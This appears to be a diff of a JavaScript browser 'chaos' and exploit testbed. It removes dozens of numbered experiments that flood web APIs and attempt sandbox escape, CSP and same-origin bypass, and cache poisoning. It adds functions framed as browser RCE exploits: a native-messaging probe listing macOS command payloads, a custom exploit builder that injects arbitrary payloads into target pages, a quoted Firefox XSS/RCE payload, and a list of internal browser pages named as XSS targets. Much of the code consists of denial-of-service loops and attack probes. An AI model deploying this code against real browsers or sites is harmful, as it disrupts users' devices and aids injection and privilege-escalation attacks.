-        addChaosLog("🌊 ReadableStream creation", 'exploit');
-        const stream = new ReadableStream({
-            start(controller) {
-                for(let i = 0; i < 10000; i++) {
-                    controller.enqueue(new Uint8Array([i % 256]));
-                }
-                controller.close();
-            }
-        });
-        const reader = stream.getReader();
-        reader.read().then(function process({done, value}) {
-            if(!done) reader.read().then(process);
-        });
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 66: TRANSFORM STREAM ============
-    function exp74_transformStreamChaos() {
-        addChaosLog("🔄 TransformStream chain", 'exploit');
-        const transform = new TransformStream({
-            transform(chunk, controller) {
-                controller.enqueue(chunk * 2);
-            }
-        });
-        const writable = transform.writable;
-        const readable = transform.readable;
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 67: COMPRESSION STREAM ============
-    function exp75_compressionChaos() {
-        addChaosLog("🗜️ CompressionStream test", 'exploit');
-        if('CompressionStream' in window) {
-            const cs = new CompressionStream('gzip');
-            const writer = cs.writable.getWriter();
-            writer.write(new TextEncoder().encode(randomString(100000)));
-            writer.close();
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 68: CRYPTO RANDOM ============
-    function exp76_cryptoRandomChaos() {
-        addChaosLog("🔐 Crypto random values", 'exploit');
-        const array = new Uint8Array(1024 * 1024);
-        crypto.getRandomValues(array);
-        addChaosLog("🔐 1MB random data generated", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 69: SUBTLE CRYPTO ============
-    async function exp77_subtleCryptoChaos() {
-        addChaosLog("🔑 SubtleCrypto operations", 'exploit');
-        const key = await crypto.subtle.generateKey({name: 'AES-GCM', length: 256}, true, ['encrypt', 'decrypt']);
-        const data = new TextEncoder().encode(randomString(10000));
-        const iv = crypto.getRandomValues(new Uint8Array(12));
-        await crypto.subtle.encrypt({name: 'AES-GCM', iv}, key, data);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 70: CERTIFICATE STORE ============
-    function exp78_certificateChaos() {
-        addChaosLog("📜 Certificate store query", 'exploit');
-        if('storage' in navigator && 'certificate' in navigator.storage) {
-            navigator.storage.certificate.query().catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 71: CREDENTIALS CHAOS ============
-    function exp79_credentialsChaos() {
-        addChaosLog("🔐 Credentials API spam", 'exploit');
-        if('credentials' in navigator) {
-            navigator.credentials.get({password: true}).catch(() => {});
-            navigator.credentials.store(new PasswordCredential({id: 'test', password: 'test'})).catch(() => {});
-            navigator.credentials.preventSilentAccess();
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 72: PAYMENT CHAOS ============
-    function exp80_paymentChaos() {
-        addChaosLog("💳 Payment Request API spam", 'exploit');
-        if('PaymentRequest' in window) {
-            const methods = [{supportedMethods: 'basic-card'}];
-            const details = {total: {label: 'Test', amount: {currency: 'USD', value: '0.01'}}};
-            new PaymentRequest(methods, details).canMakePayment().catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 73: SHARE CHAOS ============
-    function exp81_shareChaos() {
-        addChaosLog("📤 Web Share API spam", 'exploit');
-        if('share' in navigator) {
-            navigator.share({title: 'CHAOS', text: randomString(1000), url: 'https://chaos.com'}).catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 74: CONTACTS CHAOS ============
-    function exp82_contactsChaos() {
-        addChaosLog("📇 Contacts API request", 'exploit');
-        if('contacts' in navigator) {
-            navigator.contacts.select(['name', 'email'], {multiple: true}).catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 75: SCREEN ORIENTATION ============
-    function exp83_orientationChaos() {
-        addChaosLog("🔄 Screen orientation lock spam", 'chaos');
-        if('orientation' in screen) {
-            setInterval(() => {
-                screen.orientation.lock('landscape').catch(() => {});
-                screen.orientation.lock('portrait').catch(() => {});
-            }, 100);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 76: DEVICE ORIENTATION ============
-    function exp84_deviceOrientationChaos() {
-        addChaosLog("🧭 Device orientation events", 'chaos');
-        window.addEventListener('deviceorientation', (e) => {});
-        window.addEventListener('devicemotion', (e) => {});
-        window.addEventListener('deviceorientationabsolute', (e) => {});
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 77: GAMEPAD CHAOS ============
-    function exp85_gamepadChaos() {
-        addChaosLog("🎮 Gamepad API polling", 'chaos');
-        setInterval(() => {
-            navigator.getGamepads();
-        }, 10);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 78: SPEECH CHAOS ============
-    function exp86_speechChaos() {
-        addChaosLog("🎤 Speech recognition spam", 'exploit');
-        if('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
-            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
-            for(let i = 0; i < 10; i++) {
-                const recognition = new SpeechRecognition();
-                recognition.start();
-                setTimeout(() => recognition.stop(), 100);
-            }
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 79: SPEECH SYNTHESIS ============
-    function exp87_speechSynthesisChaos() {
-        addChaosLog("🔊 Speech synthesis spam", 'chaos');
-        if('speechSynthesis' in window) {
-            const utterance = new SpeechSynthesisUtterance(randomString(100));
-            for(let i = 0; i < 10; i++) {
-                window.speechSynthesis.speak(utterance);
-            }
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 80: HAPTICS CHAOS ============
-    function exp88_hapticsChaos() {
-        addChaosLog("📳 Haptics API (iOS Safari)", 'exploit');
-        if('webkit' in window) {
-            // @ts-ignore
-            window.webkit.messageHandlers?.haptic?.postMessage?.('impact');
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 81: VISUAL VIEWPORT ============
-    function exp89_visualViewportChaos() {
-        addChaosLog("👁️ VisualViewport resize events", 'chaos');
-        if(window.visualViewport) {
-            setInterval(() => {
-                window.dispatchEvent(new Event('resize'));
-                window.visualViewport.dispatchEvent(new Event('resize'));
-                window.visualViewport.dispatchEvent(new Event('scroll'));
-            }, 10);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 82: MEDIA SESSION ============
-    function exp90_mediaSessionChaos() {
-        addChaosLog("🎵 Media Session API", 'exploit');
-        if('mediaSession' in navigator) {
-            navigator.mediaSession.setActionHandler('play', () => {});
-            navigator.mediaSession.setActionHandler('pause', () => {});
-            navigator.mediaSession.setActionHandler('seekbackward', () => {});
-            navigator.mediaSession.setActionHandler('seekforward', () => {});
-            navigator.mediaSession.setActionHandler('previoustrack', () => {});
-            navigator.mediaSession.setActionHandler('nexttrack', () => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 83: PRESENTATION API ============
-    function exp91_presentationChaos() {
-        addChaosLog("📺 Presentation API request", 'exploit');
-        if('presentation' in navigator) {
-            navigator.presentation.startPresentation('https://example.com').catch(() => {});
-            navigator.presentation.reconnect('test').catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 84: SCREEN WAKE LOCK ============
-    async function exp92_screenWakeLockChaos() {
-        addChaosLog("💤 Screen Wake Lock loop", 'exploit');
-        if('wakeLock' in navigator) {
-            setInterval(async () => {
-                try {
-                    await navigator.wakeLock.request('screen');
-                } catch(e) {}
-            }, 100);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 85: VIRTUAL KEYBOARD ============
-    function exp93_virtualKeyboardChaos() {
-        addChaosLog("⌨️ VirtualKeyboard API", 'exploit');
-        if('virtualKeyboard' in navigator) {
-            navigator.virtualKeyboard.show();
-            navigator.virtualKeyboard.hide();
-            navigator.virtualKeyboard.overlayContent = true;
-            navigator.virtualKeyboard.overlayContent = false;
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 86: SANDBOX ESCAPE ============
-    function exp94_sandboxEscape() {
-        addChaosLog("🏖️ Sandbox escape attempt", 'exploit');
-        const iframe = document.createElement('iframe');
-        iframe.sandbox = 'allow-same-origin allow-scripts allow-popups allow-forms allow-modals';
-        iframe.srcdoc = `
-            <script>
-                try {
-                    // Attempt to escape sandbox
-                    window.top.location = 'javascript:alert("Sandbox escape?")';
-                    window.parent.location = 'about:blank';
-                    top.document.write('<h1>Escaped?</h1>');
-                } catch(e) {}
-            <\/script>
         `;
-        document.body.appendChild(iframe);
-        setTimeout(() => iframe.remove(), 5000);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 87: CSP BYPASS ============
-    function exp95_cspBypass() {
-        addChaosLog("🛡️ CSP bypass attempt", 'exploit');
-        const script = document.createElement('script');
-        script.src = 'data:text/javascript,alert("CSP bypass attempt")';
-        document.body.appendChild(script);
         
-        const img = document.createElement('img');
-        img.src = 'javascript:alert("CSP bypass via img")';
-        document.body.appendChild(img);
+        addLog("💀 Malicious PDF payload prepared", 'rce');
+        addLog("⚠️ Edge PDF viewer has special privileges", 'info');
         
-        const iframe = document.createElement('iframe');
-        iframe.src = 'javascript:alert("CSP bypass via iframe")';
-        document.body.appendChild(iframe);
-        updateCounter();
+        // Open PDF viewer
+        window.open('edge://pdf-viewer', '_blank');
     }
     
-    // ============ EXPERIMENT 88: SOP BYPASS ============
-    function exp96_sopBypass() {
-        addChaosLog("🌐 SOP bypass attempt", 'exploit');
-        // Try to access cross-origin iframe content
-        const iframe = document.createElement('iframe');
-        iframe.src = 'https://example.com';
-        iframe.onload = () => {
+    // EXPLOIT 8: Native Messaging
+    function exploitNativeMessaging() {
+        addLog("📨 Attempting Native Messaging host exploit...", 'info');
+        addLog("📚 Analogous to Firefox's Subprocess.jsm in XUL RCE", 'info');
+        
+        // Check for native messaging
+        if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.connectNative) {
+            addLog("✅ chrome.runtime.connectNative available!", 'rce');
+            addLog("💀 Could connect to: com.google.chrome, com.brave.browser, com.microsoft.edge", 'rce');
+            
+            // Command to execute on macOS
+            const macCommands = [
+                "open -a Calculator.app",
+                "open -a TextEdit.app",
+                "osascript -e 'display dialog \"Hacked!\"'",
+                "say 'Your browser has been compromised'"
+            ];
+            
+            addLog(`🍎 macOS RCE commands: ${macCommands.join(', ')}`, 'rce');
+        } else {
+            addLog("❌ Native messaging not directly accessible from web", 'error');
+            addLog("💡 But XSS in chrome://extensions could enable it!", 'info');
+        }
+        
+        checkPrivilegedObjects();
+    }
+    
+    // Custom exploit builder
+    function buildCustomExploit() {
+        const target = document.getElementById('targetPage').value;
+        const payload = document.getElementById('payload').value;
+        
+        addLog(`🔨 Building custom exploit for: ${target}`, 'info');
+        addLog(`💉 Payload: ${payload.substring(0, 100)}...`, 'rce');
+        
+        const fullExploit = `
+            // Firefox XUL-style injection adapted for ${currentBrowser}
+            window.open('${target}', '_blank');
+            setTimeout(() => {
+                try {
+                    // Inject payload
+                    document.body.innerHTML += '${payload.replace(/'/g, "\\'")}';
+                } catch(e) { console.log(e); }
+            }, 2000);
+        `;
+        
+        addLog("📝 Exploit generated", 'success');
+        addLog("⚠️ Executing - check if target page is vulnerable to XSS", 'warning');
+        
+        // Open target
+        window.open(target, '_blank');
+        
+        addLog("💀 Original Firefox RCE payload reference:", 'rce');
+        addLog(`<img src='data:bb"/><button><img src="x" onerror="alert(Components.stack)" /></button><img src="x'>`, 'rce');
+        
+        checkPrivilegedObjects();
+    }
+    
+    // Auto-run reconnaissance
+    window.addEventListener('load', () => {
+        addLog(`🔬 Browser: ${currentBrowser} | Platform: ${navigator.platform}`, 'info');
+        
+        // Check for internal pages access
+        const internalPages = [
+            'chrome://inspect',
+            'chrome://extensions',
+            'chrome://settings',
+            'about:debugging',
+            'about:config',
+            'edge://flags',
+            'brave://wallet',
+            'safari-web-inspector://'
+        ];
+        
+        addLog("🎯 Target internal pages (potential XSS vectors):", 'info');
+        internalPages.forEach(page => addLog(`   - ${page}`, 'info'));
+        
+        // Simulate Firefox's Components.stack check
+        if (typeof Components !== 'undefined') {
+            addLog("🔥 COMPONENTS FOUND! This is like Firefox XUL RCE!", 'rce');
             try {
-                const content = iframe.contentWindow.document.body.innerHTML;
-                addChaosLog("🌐 SOP bypass successful!", 'success');
-            } catch(e) {
-                addChaosLog("🌐 SOP blocked as expected", 'info');
-            }
-        };
-        document.body.appendChild(iframe);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 89: CORS BYPASS ============
-    function exp97_corsBypass() {
-        addChaosLog("🔗 CORS bypass attempt", 'exploit');
-        fetch('https://example.com/api/data', {
-            mode: 'no-cors',
-            credentials: 'include'
-        }).then(() => addChaosLog("🔗 CORS bypass? No", 'info')).catch(() => {});
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 90: DNS REBINDING ============
-    function exp98_dnsRebinding() {
-        addChaosLog("🔄 DNS rebinding simulation", 'exploit');
-        const img = new Image();
-        img.src = 'http://localhost:8080/private';
-        img.onload = () => addChaosLog("🔄 DNS rebinding may have worked", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 91: CACHE POISONING ============
-    function exp99_cachePoisoning() {
-        addChaosLog("💾 Cache poisoning attempt", 'exploit');
-        const cacheName = 'chaos-cache-v1';
-        caches.open(cacheName).then(cache => {
-            cache.put('/test', new Response('<h1>Poisoned!</h1>', {headers: {'Content-Type': 'text/html'}}));
-            cache.match('/test').then(response => response.text()).then(text => addChaosLog("💾 Cache poisoned", 'success'));
-        });
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 92: PRELOAD SCANNER ============
-    function exp100_preloadScanner() {
-        addChaosLog("🔍 Preload scanner attack", 'exploit');
-        const link = document.createElement('link');
-        link.rel = 'preload';
-        link.as = 'script';
-        link.href = 'javascript:alert("Preload scanner executed this")';
-        document.head.appendChild(link);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 93: CUSTOM ELEMENTS ============
-    function exp101_customElements() {
-        addChaosLog("🧩 Custom Elements registration spam", 'exploit');
-        class ChaosElement extends HTMLElement {}
-        for(let i = 0; i < 1000; i++) {
-            try {
-                customElements.define(`chaos-${i}`, ChaosElement);
+                addLog(`📚 Stack: ${Components.stack}`, 'rce');
             } catch(e) {}
         }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 94: SHADOW DOM ============
-    function exp102_shadowDomChaos() {
-        addChaosLog("🌑 Shadow DOM nesting", 'chaos');
-        const host = document.createElement('div');
-        let current = host;
-        for(let i = 0; i < 100; i++) {
-            const shadow = current.attachShadow({mode: 'open'});
-            const div = document.createElement('div');
-            shadow.appendChild(div);
-            current = div;
-        }
-        document.body.appendChild(host);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 95: WEB COMPONENTS ============
-    function exp103_webComponents() {
-        addChaosLog("🧩 Web Component lifecycle flood", 'exploit');
-        class LifecycleChaos extends HTMLElement {
-            connectedCallback() { this.dispatchEvent(new CustomEvent('connected')); }
-            disconnectedCallback() { this.dispatchEvent(new CustomEvent('disconnected')); }
-            adoptedCallback() { this.dispatchEvent(new CustomEvent('adopted')); }
-            attributeChangedCallback() { this.dispatchEvent(new CustomEvent('attribute-changed')); }
-        }
-        customElements.define('lifecycle-chaos', LifecycleChaos);
-        const el = document.createElement('lifecycle-chaos');
-        document.body.appendChild(el);
-        el.remove();
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 96: ADOPTION CHAOS ============
-    function exp104_adoptionChaos() {
-        addChaosLog("📄 Document adoption flood", 'chaos');
-        const iframe = document.createElement('iframe');
-        document.body.appendChild(iframe);
-        const div = document.createElement('div');
-        div.innerHTML = '<h1>Test</h1>';
-        for(let i = 0; i < 1000; i++) {
-            iframe.contentDocument.adoptNode(div.cloneNode(true));
-        }
-        iframe.remove();
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 97: RANGE CHAOS ============
-    function exp105_rangeChaos() {
-        addChaosLog("📐 Range object manipulation", 'chaos');
-        const range = document.createRange();
-        range.selectNode(document.body);
-        for(let i = 0; i < 10000; i++) {
-            range.setStart(document.body, i % 10);
-            range.setEnd(document.body, (i % 10) + 1);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 98: SELECTION CHAOS ============
-    function exp106_selectionChaos() {
-        addChaosLog("🖱️ Selection API spam", 'chaos');
-        setInterval(() => {
-            const sel = window.getSelection();
-            sel.removeAllRanges();
-            const range = document.createRange();
-            range.selectNode(document.body);
-            sel.addRange(range);
-        }, 10);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 99: FOCUS CHAOS ============
-    function exp107_focusChaos() {
-        addChaosLog("🎯 Focus event flood", 'chaos');
-        const inputs = [];
-        for(let i = 0; i < 100; i++) {
-            const input = document.createElement('input');
-            input.style.position = 'absolute';
-            input.style.top = `${Math.random() * 1000}px`;
-            input.style.left = `${Math.random() * 1000}px`;
-            document.body.appendChild(input);
-            inputs.push(input);
-        }
-        setInterval(() => {
-            const randomInput = inputs[Math.floor(Math.random() * inputs.length)];
-            randomInput.focus();
-        }, 10);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 100: FULLSCREEN CHAOS ============
-    function exp108_fullscreenChaos() {
-        addChaosLog("🖥️ Fullscreen toggle spam", 'chaos');
-        setInterval(() => {
-            if(document.fullscreenElement) {
-                document.exitFullscreen().catch(() => {});
-            } else {
-                document.documentElement.requestFullscreen().catch(() => {});
-            }
-        }, 100);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 101: POINTER LOCK ============
-    function exp109_pointerLockChaos() {
-        addChaosLog("🎯 Pointer Lock API spam", 'chaos');
-        setInterval(() => {
-            document.body.requestPointerLock().catch(() => {});
-            document.exitPointerLock();
-        }, 100);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 102: DRAG DROP CUSTOM ============
-    function exp110_dragDropChaos() {
-        addChaosLog("🖱️ Custom drag and drop", 'chaos');
-        const dragEl = document.createElement('div');
-        dragEl.draggable = true;
-        dragEl.innerText = 'DRAG ME';
-        dragEl.style.cssText = 'position:fixed;top:50%;left:50%;background:#ff00ff;padding:10px;z-index:999999';
-        document.body.appendChild(dragEl);
         
-        dragEl.addEventListener('dragstart', (e) => {
-            e.dataTransfer.setData('text/plain', 'chaos');
-        });
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 103: CLIPBOARD READ ============
-    async function exp111_clipboardReadChaos() {
-        addChaosLog("📋 Clipboard read attempt", 'exploit');
-        if('clipboard' in navigator && 'readText' in navigator.clipboard) {
-            const text = await navigator.clipboard.readText().catch(() => null);
-            if(text) addChaosLog(`📋 Clipboard: ${text.substring(0, 100)}`, 'info');
+        // Chromium equivalent
+        if (typeof chrome !== 'undefined') {
+            addLog("📦 Chrome API available", 'info');
+            if (chrome.devtools) addLog("🔧 DevTools API - potential privilege", 'rce');
+            if (chrome.runtime) addLog("⚡ Runtime API - extension context", 'rce');
         }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 104: EYE DROPPER ============
-    function exp112_eyeDropperChaos() {
-        addChaosLog("🎨 EyeDropper API", 'exploit');
-        if('EyeDropper' in window) {
-            const dropper = new EyeDropper();
-            dropper.open().catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 105: LAUNCH QUEUE ============
-    function exp113_launchQueueChaos() {
-        addChaosLog("🚀 Launch Queue API", 'exploit');
-        if('launchQueue' in window) {
-            window.launchQueue.setConsumer(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 106: FILE SYSTEM ACCESS ============
-    async function exp114_fileSystemChaos() {
-        addChaosLog("📁 File System Access API", 'exploit');
-        if('showOpenFilePicker' in window) {
-            const [handle] = await window.showOpenFilePicker().catch(() => []);
-            if(handle) addChaosLog("📁 File picker opened", 'info');
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 107: IDLE DETECTION ============
-    function exp115_idleChaos() {
-        addChaosLog("😴 Idle Detection API", 'exploit');
-        if('IdleDetector' in window) {
-            const detector = new IdleDetector();
-            detector.start().catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 108: PERIODIC SYNC ============
-    function exp116_periodicSyncChaos() {
-        addChaosLog("🔄 Periodic Background Sync", 'exploit');
-        if('serviceWorker' in navigator && 'periodicSync' in navigator.serviceWorker) {
-            navigator.serviceWorker.ready.then(reg => {
-                reg.periodicSync.register('chaos', {minInterval: 1000}).catch(() => {});
-            });
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 109: SHARED STORAGE ============
-    function exp117_sharedStorageChaos() {
-        addChaosLog("💾 Shared Storage API", 'exploit');
-        if('sharedStorage' in window) {
-            window.sharedStorage.set('chaos', 'value', {ignoreIfPresent: true}).catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 110: PRIVATE AGGREGATION ============
-    function exp118_privateAggregationChaos() {
-        addChaosLog("📊 Private Aggregation API", 'exploit');
-        if('privateAggregation' in window) {
-            window.privateAggregation.contributeToHistogram({bucket: 1n, value: 1}).catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 111: ATTRIBUTION REPORTING ============
-    function exp119_attributionChaos() {
-        addChaosLog("📈 Attribution Reporting API", 'exploit');
-        if('attributionReporting' in window) {
-            window.attributionReporting.registerSource({...}).catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 112: COMPUTE PRESSURE ============
-    function exp120_computePressureChaos() {
-        addChaosLog("🔥 Compute Pressure API", 'exploit');
-        if('ComputePressure' in window) {
-            const observer = new ComputePressureObserver(() => {});
-            observer.observe('cpu').catch(() => {});
-        }
-        updateCounter();
-    }
-
-    // ============ BUILD ALL EXPERIMENTS ============
-    const experiments = [
-        {name: "NULL Protocol", func: exp1_nullProtocol, desc: "null:// protocol - address bar blank", danger: false},
-        {name: "Port 0 Exploit", func: exp2_emptyPort, desc: "Port 0 invalid - browser bingung", danger: false},
-        {name: "Infinite Ports", func: exp3_infinitePorts, desc: "Port rotation attack", danger: true},
-        {name: "Unicode Zero-Width", func: exp4_unicodeExplosion, desc: "1000 zero-width chars", danger: false},
-        {name: "RTL/LTR Chaos", func: exp5_rtlMayhem, desc: "Bidirectional text chaos", danger: false},
-        {name: "Zalgo Text", func: exp6_zalgoText, desc: "Zalgo text injection", danger: false},
-        {name: "Microsecond Race", func: exp7_microsecondRace, desc: "1ms race condition", danger: true},
-        {name: "Nanosecond Loop", func: exp8_nanoSecondLoop, desc: "History API spam", danger: true},
-        {name: "Heap Spray", func: exp9_heapSpray, desc: "Memory heap spray", danger: true},
-        {name: "Type Confusion", func: exp10_typeConfusion, desc: "JS engine type confusion", danger: true},
-        {name: "DOM Clobbering", func: exp11_domClobbering, desc: "Override native objects", danger: false},
-        {name: "Iframe Inception", func: exp12_iframeInception, desc: "Infinite iframe nesting", danger: true},
-        {name: "Service Worker SW", func: exp13_serviceWorkerSelfDestruct, desc: "Service worker intercept", danger: true},
-        {name: "WebGL Overflow", func: exp14_webglMemoryOverflow, desc: "GPU buffer overflow", danger: true},
-        {name: "Canvas Chaos", func: exp15_canvasPixelChaos, desc: "100k random rectangles", danger: true},
-        {name: "Webhook Beacon", func: exp16_webhookBeaconSpam, desc: "1000 beacon requests", danger: false},
-        {name: "Keyboard Flood", func: exp17_keyboardEventFlood, desc: "Event flooding", danger: true},
-        {name: "Storage Bomb", func: exp18_storageBomb, desc: "localStorage filling", danger: true},
-        {name: "Crypto Mining", func: exp19_cryptoMining, desc: "CPU overload", danger: true},
-        {name: "Navigation Trap", func: exp20_navigationLoop, desc: "Infinite navigation", danger: true},
-        {name: "Audio Chaos", func: exp21_audioChaos, desc: "Audio context spam", danger: false},
-        {name: "Worker Army", func: exp22_workerArmy, desc: "100 web workers", danger: true},
-        {name: "Geolocation Spam", func: exp23_geolocationSpam, desc: "Location requests", danger: false},
-        {name: "Notification Bomb", func: exp24_notificationBomb, desc: "Notification spam", danger: false},
-        {name: "Drag Chaos", func: exp25_dragChaos, desc: "Drag event flood", danger: false},
-        {name: "CSS Chaos", func: exp26_cssChaos, desc: "1000 keyframe animations", danger: false},
-        {name: "History Break", func: exp27_historyBreak, desc: "History API flood", danger: true},
-        {name: "PostMessage Flood", func: exp28_postMessageFlood, desc: "Cross-origin message", danger: false},
-        {name: "Viewport Chaos", func: exp29_viewportChaos, desc: "Meta viewport spam", danger: false},
-        {name: "Print Spam", func: exp30_printChaos, desc: "Print dialog loop", danger: true},
-        {name: "Clipboard Spam", func: exp31_clipboardChaos, desc: "Clipboard write flood", danger: false},
-        {name: "Battery API", func: exp32_batteryChaos, desc: "Battery polling", danger: false},
-        {name: "Bluetooth Scan", func: exp33_bluetoothChaos, desc: "Bluetooth requests", danger: false},
-        {name: "USB Request", func: exp34_usbChaos, desc: "USB device requests", danger: false},
-        {name: "MIDI Access", func: exp35_midiChaos, desc: "MIDI API spam", danger: false},
-        {name: "Vibration", func: exp36_vibrationChaos, desc: "Vibration pattern", danger: false},
-        {name: "Wake Lock", func: exp37_wakeLockSpam, desc: "Wake lock requests", danger: false},
-        {name: "SharedArrayBuffer", func: exp38_sharedArrayBufferChaos, desc: "SAB allocation", danger: true},
-        {name: "Atomic Ops", func: exp39_atomicChaos, desc: "Atomic operations", danger: true},
-        {name: "WebAssembly", func: exp40_wasmChaos, desc: "WASM compilation", danger: false},
-        {name: "Intersection Obs", func: exp41_intersectionChaos, desc: "IntersectionObserver", danger: false},
-        {name: "Resize Obs", func: exp42_resizeChaos, desc: "ResizeObserver spam", danger: false},
-        {name: "Mutation Obs", func: exp43_mutationChaos, desc: "MutationObserver flood", danger: true},
-        {name: "Performance Marks", func: exp44_performanceChaos, desc: "Performance API spam", danger: false},
-        {name: "Resource Timing", func: exp45_resourceTimingFlood, desc: "Resource timing flood", danger: false},
-        {name: "Session Storage", func: exp46_sessionStorageBomb, desc: "Session storage bomb", danger: true},
-        {name: "IndexedDB Chaos", func: exp47_indexedDBChaos, desc: "IndexedDB flood", danger: true},
-        {name: "Cookie Monster", func: exp48_cookieMonster, desc: "1000 cookies", danger: false},
-        {name: "CORS Preflight", func: exp49_corsChaos, desc: "CORS preflight spam", danger: false},
-        {name: "WebSocket Army", func: exp50_websocketArmy, desc: "100 WebSockets", danger: true},
-        {name: "EventSource", func: exp51_eventSourceChaos, desc: "EventSource connections", danger: false},
-        {name: "Dialog Spam", func: exp52_dialogChaos, desc: "Alert/confirm/prompt", danger: true},
-        {name: "Console Chaos", func: exp53_consoleChaos, desc: "Console method flood", danger: false},
-        {name: "XSS Polyglot", func: exp54_xssPolyglot, desc: "XSS polyglot injection", danger: false},
-        {name: "Template Chaos", func: exp55_templateChaos, desc: "Template literal", danger: false},
-        {name: "Eval Chaos", func: exp56_evalChaos, desc: "eval() spam", danger: true},
-        {name: "Function Constructor", func: exp57_functionConstructorChaos, desc: "Function constructor", danger: false},
-        {name: "With Statement", func: exp58_withChaos, desc: "'with' statement chaos", danger: false},
-        {name: "Proxy Object", func: exp59_proxyChaos, desc: "Proxy interception", danger: false},
-        {name: "Reflect API", func: exp60_reflectChaos, desc: "Reflect API abuse", danger: false},
-        {name: "Symbol Chaos", func: exp61_symbolChaos, desc: "Symbol generation", danger: false},
-        {name: "Iterator Chaos", func: exp62_iteratorChaos, desc: "Infinite generator", danger: true},
-        {name: "Promise Chaos", func: exp63_promiseChaos, desc: "Promise flood", danger: false},
-        {name: "Async Chaos", func: exp64_asyncChaos, desc: "Async recursion", danger: true},
-        {name: "Fetch Chain", func: exp65_fetchChain, desc: "Promise chain", danger: false},
-        {name: "URL Chaos", func: exp66_urlChaos, desc: "URLSearchParams flood", danger: false},
-        {name: "Blob Chaos", func: exp67_blobChaos, desc: "1000 blobs", danger: true},
-        {name: "FileReader", func: exp68_fileReaderChaos, desc: "FileReader spam", danger: false},
-        {name: "FormData", func: exp69_formDataChaos, desc: "FormData construction", danger: false},
-        {name: "Headers Chaos", func: exp70_headersChaos, desc: "Headers object flood", danger: false},
-        {name: "Request Chaos", func: exp71_requestChaos, desc: "Request object flood", danger: false},
-        {name: "Response Chaos", func: exp72_responseChaos, desc: "Response object flood", danger: false},
-        {name: "Stream Chaos", func: exp73_streamChaos, desc: "ReadableStream", danger: false},
-        {name: "Transform Stream", func: exp74_transformStreamChaos, desc: "TransformStream", danger: false},
-        {name: "Compression", func: exp75_compressionChaos, desc: "CompressionStream", danger: false},
-        {name: "Crypto Random", func: exp76_cryptoRandomChaos, desc: "1MB random data", danger: false},
-        {name: "Subtle Crypto", func: exp77_subtleCryptoChaos, desc: "AES encryption", danger: false},
-        {name: "Certificate", func: exp78_certificateChaos, desc: "Certificate store", danger: false},
-        {name: "Credentials", func: exp79_credentialsChaos, desc: "Credentials API", danger: false},
-        {name: "Payment API", func: exp80_paymentChaos, desc: "Payment Request", danger: false},
-        {name: "Web Share", func: exp81_shareChaos, desc: "Share API", danger: false},
-        {name: "Contacts API", func: exp82_contactsChaos, desc: "Contacts select", danger: false},
-        {name: "Orientation", func: exp83_orientationChaos, desc: "Screen orientation", danger: false},
-        {name: "Device Orientation", func: exp84_deviceOrientationChaos, desc: "Device orientation", danger: false},
-        {name: "Gamepad", func: exp85_gamepadChaos, desc: "Gamepad polling", danger: false},
-        {name: "Speech Recog", func: exp86_speechChaos, desc: "Speech recognition", danger: false},
-        {name: "Speech Synthesis", func: exp87_speechSynthesisChaos, desc: "Speech synthesis", danger: false},
-        {name: "Haptics", func: exp88_hapticsChaos, desc: "Haptics API", danger: false},
-        {name: "Visual Viewport", func: exp89_visualViewportChaos, desc: "VisualViewport", danger: false},
-        {name: "Media Session", func: exp90_mediaSessionChaos, desc: "Media Session", danger: false},
-        {name: "Presentation", func: exp91_presentationChaos, desc: "Presentation API", danger: false},
